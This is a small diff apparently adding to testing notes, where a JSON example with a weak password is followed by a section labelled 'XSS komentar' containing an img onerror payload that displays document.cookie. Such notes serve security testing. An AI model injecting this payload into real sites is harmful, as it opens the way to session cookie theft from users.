@@ -13,3 +13,8 @@
     "password": "1234"
 }
 ```
+
+XSS komentar 
+```html
+<img src="nonexistent.png" onerror="alert(document.cookie);" />
+```
